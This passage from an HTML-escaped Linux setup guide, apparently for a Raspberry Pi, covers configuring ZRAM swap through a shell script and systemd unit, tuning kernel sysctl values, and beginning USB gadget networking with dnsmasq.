&lt;span id=&quot;cb4-4&quot;&gt;&lt;a href=&quot;#cb4-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;st&quot;&gt;&amp;quot;start&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-5&quot;&gt;&lt;a href=&quot;#cb4-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;co&quot;&gt;# The &amp;quot;-s&amp;quot; option sets the size of the ZRAM device&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-6&quot;&gt;&lt;a href=&quot;#cb4-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;co&quot;&gt;# *before* compression; ZRAM will *actually* use&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-7&quot;&gt;&lt;a href=&quot;#cb4-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;co&quot;&gt;# something closer to 30% - 50% of this value, depending&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-8&quot;&gt;&lt;a href=&quot;#cb4-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;co&quot;&gt;# on the compression algorithm used. As a rule of thumb,&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-9&quot;&gt;&lt;a href=&quot;#cb4-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;co&quot;&gt;# set &amp;quot;-s&amp;quot; to be equal to the amount of RAM you actually&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-10&quot;&gt;&lt;a href=&quot;#cb4-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;co&quot;&gt;# have *or* 8G, whichever is *less*.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-11&quot;&gt;&lt;a href=&quot;#cb4-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;va&quot;&gt;ZRAMDEV=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;ex&quot;&gt;zramctl&lt;/span&gt; -f -s 8G -a zstd&lt;span class=&quot;va&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-12&quot;&gt;&lt;a href=&quot;#cb4-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;ex&quot;&gt;mkswap&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$ZRAMDEV&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-13&quot;&gt;&lt;a href=&quot;#cb4-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;ex&quot;&gt;swapon&lt;/span&gt; -p 10 &lt;span class=&quot;va&quot;&gt;$ZRAMDEV&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-14&quot;&gt;&lt;a href=&quot;#cb4-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-15&quot;&gt;&lt;a href=&quot;#cb4-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;st&quot;&gt;&amp;quot;stop&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-16&quot;&gt;&lt;a href=&quot;#cb4-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;kw&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;ZRAMDEV&lt;/span&gt; in &lt;span class=&quot;va&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;/zram/ { print $1 }&amp;#39;&lt;/span&gt; /proc/swaps&lt;span class=&quot;va&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;do&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-17&quot;&gt;&lt;a href=&quot;#cb4-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            &lt;span class=&quot;ex&quot;&gt;swapoff&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$ZRAMDEV&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-18&quot;&gt;&lt;a href=&quot;#cb4-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;            &lt;span class=&quot;ex&quot;&gt;zramctl&lt;/span&gt; -r &lt;span class=&quot;va&quot;&gt;$ZRAMDEV&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-19&quot;&gt;&lt;a href=&quot;#cb4-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;kw&quot;&gt;done&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-20&quot;&gt;&lt;a href=&quot;#cb4-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-21&quot;&gt;&lt;a href=&quot;#cb4-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;st&quot;&gt;&amp;quot;restart&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-22&quot;&gt;&lt;a href=&quot;#cb4-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;va&quot;&gt;$0&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;stop&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-23&quot;&gt;&lt;a href=&quot;#cb4-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;va&quot;&gt;$0&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;start&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-24&quot;&gt;&lt;a href=&quot;#cb4-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-25&quot;&gt;&lt;a href=&quot;#cb4-25&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    * &lt;span class=&quot;kw&quot;&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-26&quot;&gt;&lt;a href=&quot;#cb4-26&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;USAGE: &lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;basename&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;st&quot;&gt; (start|stop|restart)&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-27&quot;&gt;&lt;a href=&quot;#cb4-27&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;kw&quot;&gt;;;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-28&quot;&gt;&lt;a href=&quot;#cb4-28&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;esac&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then create the systemd service file /etc/systemd/system/zram.service:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode ini&quot;&gt;&lt;code class=&quot;sourceCode ini&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;[Unit]&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-2&quot;&gt;&lt;a href=&quot;#cb5-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;Description&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;ZRAM-based virtual swap device&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-3&quot;&gt;&lt;a href=&quot;#cb5-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;Requires&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;systemd-modules-load.service&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-4&quot;&gt;&lt;a href=&quot;#cb5-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-5&quot;&gt;&lt;a href=&quot;#cb5-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;[Install]&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-6&quot;&gt;&lt;a href=&quot;#cb5-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;WantedBy&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;sysinit.target&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-7&quot;&gt;&lt;a href=&quot;#cb5-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-8&quot;&gt;&lt;a href=&quot;#cb5-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;[Service]&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-9&quot;&gt;&lt;a href=&quot;#cb5-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;oneshot&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-10&quot;&gt;&lt;a href=&quot;#cb5-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;ExecStart&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;/usr/local/sbin/zram.sh start&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-11&quot;&gt;&lt;a href=&quot;#cb5-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;ExecStop&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;/usr/local/sbin/zram.sh stop&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-12&quot;&gt;&lt;a href=&quot;#cb5-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;dt&quot;&gt;RemainAfterExit&lt;/span&gt;&lt;span class=&quot;ot&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally, make sure that everything's enabled.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-2&quot;&gt;&lt;a href=&quot;#cb6-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-3&quot;&gt;&lt;a href=&quot;#cb6-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; -s&lt;/span&gt;
&lt;span id=&quot;cb6-4&quot;&gt;&lt;a href=&quot;#cb6-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-5&quot;&gt;&lt;a href=&quot;#cb6-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Make sure that the ZRAM module is loaded.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-6&quot;&gt;&lt;a href=&quot;#cb6-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-7&quot;&gt;&lt;a href=&quot;#cb6-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; zram &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/modules&lt;/span&gt;
&lt;span id=&quot;cb6-8&quot;&gt;&lt;a href=&quot;#cb6-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-9&quot;&gt;&lt;a href=&quot;#cb6-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Make the zram.sh script executable.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-10&quot;&gt;&lt;a href=&quot;#cb6-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-11&quot;&gt;&lt;a href=&quot;#cb6-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;chmod&lt;/span&gt; +x /usr/local/sbin/zram.sh&lt;/span&gt;
&lt;span id=&quot;cb6-12&quot;&gt;&lt;a href=&quot;#cb6-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-13&quot;&gt;&lt;a href=&quot;#cb6-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Enable required services.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-14&quot;&gt;&lt;a href=&quot;#cb6-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-15&quot;&gt;&lt;a href=&quot;#cb6-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;systemctl&lt;/span&gt; daemon-reload&lt;/span&gt;
&lt;span id=&quot;cb6-16&quot;&gt;&lt;a href=&quot;#cb6-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;systemctl&lt;/span&gt; enable zram.service&lt;/span&gt;
&lt;span id=&quot;cb6-17&quot;&gt;&lt;a href=&quot;#cb6-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-18&quot;&gt;&lt;a href=&quot;#cb6-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Encourage the kernel to preferentially clean up memory and&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-19&quot;&gt;&lt;a href=&quot;#cb6-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# swap into ZRAM sooner.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-20&quot;&gt;&lt;a href=&quot;#cb6-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-21&quot;&gt;&lt;a href=&quot;#cb6-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;vm.vfs_cache_pressure=500&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/sysctl.conf&lt;/span&gt;
&lt;span id=&quot;cb6-22&quot;&gt;&lt;a href=&quot;#cb6-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;vm.swappiness=100&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/sysctl.conf&lt;/span&gt;
&lt;span id=&quot;cb6-23&quot;&gt;&lt;a href=&quot;#cb6-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;vm.dirty_background_ratio=1&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/sysctl.conf&lt;/span&gt;
&lt;span id=&quot;cb6-24&quot;&gt;&lt;a href=&quot;#cb6-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;vm.dirty_ratio=50&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/sysctl.conf&lt;/span&gt;
&lt;span id=&quot;cb6-25&quot;&gt;&lt;a href=&quot;#cb6-25&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-26&quot;&gt;&lt;a href=&quot;#cb6-26&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-27&quot;&gt;&lt;a href=&quot;#cb6-27&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-28&quot;&gt;&lt;a href=&quot;#cb6-28&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You should reboot after doing all of this.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://linuxreviews.org/Zram&quot;&gt;Zram&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/foundObjects/zram-swap&quot;&gt;zram-swap&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://haydenjames.io/raspberry-pi-performance-add-zram-kernel-parameters/&quot;&gt;Raspberry Pi Performance: Add ZRAM and these Kernel Parameters&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://unix.stackexchange.com/questions/604563/how-to-automatically-run-mkinitramfs-on-debian-after-apt-update-for-kernel-packa&quot;&gt;How to automatically run mkinitramfs on Debian after apt update for kernel packages?&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://haydenjames.io/linux-performance-almost-always-add-swap-space/&quot;&gt;Linux Performance: Why You Should Almost Always Add Swap Space&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://haydenjames.io/linux-performance-almost-always-add-swap-part2-zram/&quot;&gt;Linux Performance: Almost Always Add Swap. Part 2: ZRAM&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;network-access-and-usb-gadget-mode&quot;&gt;Network Access and USB Gadget Mode&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-2&quot;&gt;&lt;a href=&quot;#cb7-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-3&quot;&gt;&lt;a href=&quot;#cb7-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; -s&lt;/span&gt;
&lt;span id=&quot;cb7-4&quot;&gt;&lt;a href=&quot;#cb7-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-5&quot;&gt;&lt;a href=&quot;#cb7-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Install pre-requisits.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-6&quot;&gt;&lt;a href=&quot;#cb7-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-7&quot;&gt;&lt;a href=&quot;#cb7-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;apt&lt;/span&gt; install dnsmasq&lt;/span&gt;
&lt;span id=&quot;cb7-8&quot;&gt;&lt;a href=&quot;#cb7-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-9&quot;&gt;&lt;a href=&quot;#cb7-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Update firmware overlay and initramfs kernel modules.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-10&quot;&gt;&lt;a href=&quot;#cb7-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-11&quot;&gt;&lt;a href=&quot;#cb7-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;dtoverlay=dwc2&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /boot/config.txt&lt;/span&gt;
&lt;span id=&quot;cb7-12&quot;&gt;&lt;a href=&quot;#cb7-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/initramfs-tools/modules&lt;/span&gt;
&lt;span id=&quot;cb7-13&quot;&gt;&lt;a href=&quot;#cb7-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; dwc2 &lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/initramfs-tools/modules&lt;/span&gt;
&lt;span id=&quot;cb7-14&quot;&gt;&lt;a href=&quot;#cb7-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-15&quot;&gt;&lt;a href=&quot;#cb7-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Create /etc/network/interfaces.d/usb0.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-16&quot;&gt;&lt;a href=&quot;#cb7-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-17&quot;&gt;&lt;a href=&quot;#cb7-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; /etc/network/interfaces.d/usb0 &lt;span class=&quot;op&quot;&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-18&quot;&gt;&lt;a href=&quot;#cb7-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;auto usb0&lt;/span&gt;
&lt;span id=&quot;cb7-19&quot;&gt;&lt;a href=&quot;#cb7-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;allow-hotplug usb0&lt;/span&gt;
&lt;span id=&quot;cb7-20&quot;&gt;&lt;a href=&quot;#cb7-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;iface usb0 inet static&lt;/span&gt;
&lt;span id=&quot;cb7-21&quot;&gt;&lt;a href=&quot;#cb7-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    address 10.55.0.1&lt;/span&gt;
&lt;span id=&quot;cb7-22&quot;&gt;&lt;a href=&quot;#cb7-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    netmask 255.255.255.248&lt;/span&gt;
&lt;span id=&quot;cb7-23&quot;&gt;&lt;a href=&quot;#cb7-23&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;op&quot;&gt;EOF&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-24&quot;&gt;&lt;a href=&quot;#cb7-24&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-25&quot;&gt;&lt;a href=&quot;#cb7-25&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Create /etc/dnsmasq.d/ipad.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-26&quot;&gt;&lt;a href=&quot;#cb7-26&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-27&quot;&gt;&lt;a href=&quot;#cb7-27&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;gt;&lt;/span&gt; /etc/dnsmasq.d/ipad &lt;span class=&quot;op&quot;&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-28&quot;&gt;&lt;a href=&quot;#cb7-28&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;interface=usb0&lt;/span&gt;
&lt;span id=&quot;cb7-29&quot;&gt;&lt;a href=&quot;#cb7-29&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;dhcp-range=10.55.0.2,10.55.0.6,255.255.255.248,1h&lt;/span&gt;
&lt;span id=&quot;cb7-30&quot;&gt;&lt;a href=&quot;#cb7-30&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-31&quot;&gt;&lt;a href=&quot;#cb7-31&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;dhcp-option=3&lt;/span&gt;
&lt;span id=&quot;cb7-32&quot;&gt;&lt;a href=&quot;#cb7-32&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;dhcp-option=6&lt;/span&gt;
